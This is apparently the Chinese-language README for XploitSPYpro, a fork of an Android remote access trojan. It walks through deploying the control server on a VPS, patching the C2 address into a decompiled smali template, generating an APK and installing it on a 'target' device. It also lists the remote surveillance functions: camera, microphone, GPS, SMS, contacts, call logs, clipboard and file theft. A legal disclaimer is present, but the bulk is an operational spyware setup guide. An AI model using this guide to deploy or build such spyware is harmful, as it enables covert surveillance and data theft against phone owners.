# XploitSPYpro

> ⚠️ **法律声明：本项目仅限内部合法学习使用，严禁外传或用于非法用途！**
> 
> 未经授权监控他人设备属于违法行为。使用本工具进行安全研究时，必须确保：
> - 仅用于自己拥有的设备
> - 已获得目标设备所有者的明确书面授权
> - 符合所在国家/地区的网络安全法律法规
> 
> **使用者需对一切行为承担法律责任，作者/维护者不承担任何连带责任。**

---

## 项目概述

XploitSPY 是一款 Android 远程管理工具（RAT），用于安全研究和渗透测试。

**本分支改进**：已移除原版后门（`authxspy.herokuapp.com` 凭证外泄代码），可安全部署。

重要指令
# 改 smali 模板

sed -i 's/:8080?model=/:80?model=/g' /home/XploitSPYpro-main/server/app/factory/decompiled/smali/com/remote/app/h.smali

 
# 改 builder.ejs
sed -i "s/'8080'/'80'/g" /home/XploitSPYpro-main/server/assets/views/builder.ejs


=========================


检测 build-aligned-signed.apk 的设定值

unzip -p assets/webpublic/build-aligned-signed.apk classes.dex | strings | grep "http://" | head -10



cd /home
rm -rf XploitSPY-master

git clone https://github.com/dg49888safe/XploitSPYpro.git XploitSPY-master

cd XploitSPY-master/server

npm install

PORT=8080 node index.js
---

## 项目结构

```
XploitSPYpro/
├── client/                     # Android 客户端（Android Studio 项目）
│   ├── app/                   # 客户端源代码
│   │   └── src/main/java/     # Java 源码
│   ├── build.gradle           # Gradle 构建配置
│   └── gradle/                # Gradle wrapper
│
├── server/                     # Node.js 服务端
│   ├── index.js               # 服务端入口，启动 HTTP + Socket.IO
│   ├── maindb.json            # lowdb 本地数据库（管理员账号、日志）
│   ├── package.json           # Node 依赖
│   ├──
│   ├── app/factory/           # APK 构建工厂
│   │   ├── apktool.jar        # APK 反编译/重打包工具
│   │   ├── uber-apk-signer-1.1.0.jar  # APK 签名工具
│   │   ├── release.jks        # 签名证书
│   │   └── decompiled/        # 解包后的 smali 源码
│   │       └── smali/com/remote/app/  # 待 patch 的 smali 文件
│   │
│   ├── assets/                # Web 前端资源
│   │   ├── views/             # EJS 模板页面
│   │   │   ├── index.ejs      # 控制面板主页面
│   │   │   ├── login.ejs      # 登录页面
│   │   │   ├── builder.ejs    # APK 生成器页面
│   │   │   ├── deviceManager.ejs  # 设备管理页
│   │   │   └── logs.ejs       # 日志页面
│   │   └── webpublic/         # 静态资源（CSS/JS/图片）
│   │
│   ├── includes/              # 核心服务端模块
│   │   ├── const.js           # 常量配置（端口、路径、消息码）
│   │   ├── expressRoutes.js   # Express 路由（登录、面板、API）
│   │   ├── clientManager.js   # 客户端连接管理、命令下发
│   │   ├── apkBuilder.js      # APK 生成逻辑（patch C2 地址）
│   │   ├── databaseGateway.js # lowdb 数据库封装
│   │   └── logManager.js      # 日志记录
│   │
│   └── clientData/            # 从客户端下载的文件存储目录
│
├── .github/                   # GitHub 配置
├── Procfile                   # Heroku 部署配置
├── app.json                   # Heroku 应用配置
├── azuredeploy.json           # Azure 部署模板
├── system.properties          # Java 版本指定
├── LICENSE                    # 开源协议
└── package.json               # 根目录依赖
```

---

## 各源码文件用途详解

### 服务端核心文件

| 文件路径 | 用途说明 |
|---------|---------|
| `server/index.js` | 服务端入口，创建 HTTP + Socket.IO 服务器，监听客户端连接，初始化全局变量 |
| `server/includes/const.js` | 全局常量配置：监听端口(80)、控制端口、APK 构建路径、消息类型编码(0xCA相机/0xLO定位等) |
| `server/includes/expressRoutes.js` | **Web 路由定义**：登录认证、面板渲染、APK 生成器、设备管理 API、密码修改 |
| `server/includes/clientManager.js` | **核心客户端管理**：维护在线设备列表、处理 Socket.IO 事件、下发远程指令、存储设备数据 |
| `server/includes/apkBuilder.js` | APK 生成器：调用 apktool 反编译 → patch C2 地址到 smali → 重打包 → 签名 |
| `server/includes/databaseGateway.js` | lowdb 数据库封装，用于存储管理员账号、登录令牌、操作日志 |
| `server/includes/logManager.js` | 简单的日志记录器，按类型(ERROR/ALERT/SUCCESS/INFO)存储日志 |
| `server/maindb.json` | 本地 JSON 数据库，存储管理员账号密码(MD5)、登录 token、客户端列表 |

### 关键 Smali 文件

| 文件路径 | 用途说明 |
|---------|---------|
| `server/app/factory/decompiled/smali/com/remote/app/h.smali` | **APK C2 地址模板**，其中的 `http://xwizer.herokuapp.com:80` 会被 `apkBuilder.js` 替换为用户填写的 VPS 地址 |

### 前端模板文件

| 文件路径 | 用途说明 |
|---------|---------|
| `server/assets/views/index.ejs` | 控制面板首页，显示在线/离线设备列表 |
| `server/assets/views/login.ejs` | 管理员登录页面 |
| `server/assets/views/builder.ejs` | APK 生成页面，输入 VPS 地址和端口，一键生成定制 APK |
| `server/assets/views/deviceManager.ejs` | 设备详情管理页，查看/下载设备数据、发送远程指令 |
| `server/assets/views/welcome.ejs` | 欢迎页面/ landing page |

### 客户端（Android）

| 路径 | 说明 |
|-----|------|
| `client/app/src/main/java/` | Android 客户端 Java 源码（实际的监控逻辑：摄像头、录音、定位、短信读取等） |
| `client/build.gradle` | Android 项目构建配置 |

---

## 安装部署教程（Ubuntu 22.04 VPS）

### 1. 系统环境准备

```bash
# 更新系统
sudo apt update && sudo apt upgrade -y

# 安装必要依赖
sudo apt install -y curl git build-essential openjdk-11-jdk unzip

# 确认 Java 版本（apktool 需要 Java 11）
java -version
```

### 2. 安装 Node.js（建议 16.x）

```bash
# 使用 nvm 安装 Node.js
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
source ~/.bashrc

nvm install 16
nvm use 16
node -v   # 应显示 v16.x.x
```

### 3. 拉取项目

```bash
cd /opt
sudo git clone https://github.com/dg49888safe/XploitSPYpro.git xploitspy
sudo chown -R $USER:$USER xploitspy
cd xploitspy
```

### 4. 安装依赖

```bash
# 安装根目录依赖
npm install

# 安装服务端依赖
cd server
npm install
cd ..
```

### 5. 配置修改

#### 修改默认管理员密码

```bash
# 生成新密码的 MD5 值（示例：MySecurePass123）
echo -n "MySecurePass123" | md5sum
# 输出类似：5ebe2294ecd0e0f08eab7690d2a6ee69  -

# 编辑数据库文件，替换 password 字段
nano server/maindb.json
```

将：
```json
"password": "5f4dcc3b5aa765d61d8327deb882cf99"
```
替换为新生成的 MD5 值。

#### 修改监听端口（可选）

默认端口是 80，需要 root 权限。建议改成 8080：

```bash
nano server/includes/const.js
# 修改：exports.web_port = 80  →  exports.web_port = 8080
```

### 6. 启动服务

#### 测试运行

```bash
cd /opt/xploitspy
PORT=8080 node server/index.js
```

访问 `http://你的VPS_IP:8080` 应看到欢迎页面。

#### 使用 PM2 守护进程

```bash
# 安装 PM2
npm install -g pm2

# 启动服务
cd /opt/xploitspy
PORT=8080 pm2 start server/index.js --name xploitspy

# 保存配置并设置开机自启
pm2 save
pm2 startup systemd
# 按提示运行显示的 sudo 命令
```

常用命令：
```bash
pm2 logs xploitspy    # 查看日志
pm2 restart xploitspy # 重启
pm2 stop xploitspy    # 停止
```

### 7. 防火墙配置

```bash
# 开放 SSH（必须）
sudo ufw allow OpenSSH

# 开放服务端口
sudo ufw allow 8080/tcp

# 启用防火墙
sudo ufw enable
```

### 8. 配置反向代理 + HTTPS（强烈推荐）

使用 Nginx 和 Let's Encrypt：

```bash
# 安装 Nginx
sudo apt install -y nginx

# 安装 Certbot
sudo apt install -y certbot python3-certbot-nginx

# 创建 Nginx 配置
sudo nano /etc/nginx/sites-available/xploitspy
```

写入配置：
```nginx
server {
    listen 80;
    server_name your.domain.com;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

启用配置：
```bash
sudo ln -s /etc/nginx/sites-available/xploitspy /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx

# 申请 HTTPS 证书
sudo certbot --nginx -d your.domain.com
```

---

## 使用说明

### 生成定制 APK

1. 登录 Web 面板 (`/login`)
2. 进入 `/builder` 页面
3. 输入你的 VPS 公网 IP 或域名 + 端口
4. 点击生成，下载 APK 文件
5. 安装到目标 Android 设备

### 设备管理

- 设备上线后会显示在 `/panel` 页面
- 点击设备进入 `/manage/:deviceid/:page` 管理详情
- 支持的远程指令：
  - 📷 相机拍照
  - 🎤 麦克风录音
  - 📍 GPS 定位
  - 📁 文件浏览/下载
  - 📞 通话记录
  - 💬 短信记录
  - 📋 通讯录
  - 📶 WiFi 信息
  - 🔔 通知监听
  - 📄 剪贴板内容
  - 📱 已安装应用列表

---

## 安全注意事项

1. **已移除的后门**：原版代码会向 `authxspy.herokuapp.com` 发送管理员凭据，本分支已删除该代码
2. **默认密码**：部署后务必修改 `maindb.json` 中的默认密码
3. **HTTPS**：生产环境必须使用 HTTPS，避免凭据明文传输
4. **访问控制**：建议配置 Nginx Basic Auth 或限制 IP 白名单
5. **日志清理**：定期清理 `server/clientData/` 中的敏感数据

---

## 故障排查

| 问题 | 解决方案 |
|-----|---------|
| `EACCES: permission denied` | 端口 < 1024 需要 root，改用 8080 或运行 `sudo setcap 'cap_net_bind_service=+ep' $(which node)` |
| `Java not installed` | `sudo apt install openjdk-11-jdk` |
| `apktool build failed` | 检查 `server/app/factory/` 下是否有 `apktool.jar` |
| 设备无法上线 | 检查防火墙是否开放端口，APK 是否使用正确 C2 地址 |
| Socket.IO 连接失败 | 确保 Nginx 配置了 WebSocket 代理头（Upgrade/Connection） |

---

## 技术栈

- **后端**：Node.js + Express + Socket.IO
- **数据库**：lowdb (JSON 文件)
- **前端**：EJS 模板 + Semantic UI + Bootstrap
- **APK 构建**：Apktool + Uber-APK-Signer
- **地图**：Leaflet.js

---

## ⚠️ 再次声明

**本项目仅限内部合法学习使用，严禁外传！**

任何未经授权使用本工具监控他人设备的行为均属违法。使用者需自行承担一切法律责任。
